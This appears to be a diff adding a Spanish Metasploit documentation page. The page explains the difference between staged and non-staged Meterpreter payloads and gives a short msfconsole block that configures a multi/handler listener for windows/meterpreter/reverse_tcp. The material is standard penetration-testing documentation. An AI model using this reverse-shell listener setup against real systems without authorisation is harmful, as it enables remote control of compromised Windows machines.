@@ -1,0 +1,23 @@
+---
+title: "Cómo usar los comandos stagers"
+description: Diferencia entre payloads staged y no-staged, y cuándo conviene cada uno.
+---
+
+Un payload en Metasploit puede ser **staged** o **no-staged (single)**:
+
+- **No-staged** (ej. `windows/meterpreter_reverse_tcp` sin más) — el payload completo se envía de una sola vez al objetivo. Es más grande, pero no depende de una segunda conexión: más confiable en redes inestables o con poca ventana de tiempo para explotar.
+- **Staged** (ej. `windows/meterpreter/reverse_tcp`) — se envía primero un **stager** minúsculo (unos pocos cientos de bytes) cuya única tarea es abrir una conexión de vuelta y descargar el **stage** real (el cuerpo completo de Meterpreter). Es más pequeño para el exploit inicial, algo crítico cuando el espacio disponible en el buffer vulnerable es limitado.
+
+Desde msfconsole, el comando `generate` y las opciones del handler dejan ver esta separación:
+
+```
+msf > use exploit/multi/handler
+msf > set PAYLOAD windows/meterpreter/reverse_tcp
+msf > set LHOST 0.0.0.0
+msf > set LPORT 4444
+msf > exploit -j
+```
+
+El handler configurado con un payload staged sabe automáticamente que debe esperar primero la conexión del stager y luego transmitir el stage — no requiere configuración adicional del operador.
+
+Al elegir un payload en un exploit nuevo, si el espacio en el buffer vulnerable es muy limitado, preferí un stager pequeño; si la red es poco confiable o hay filtrado agresivo de conexiones repetidas, un payload no-staged reduce puntos de falla.
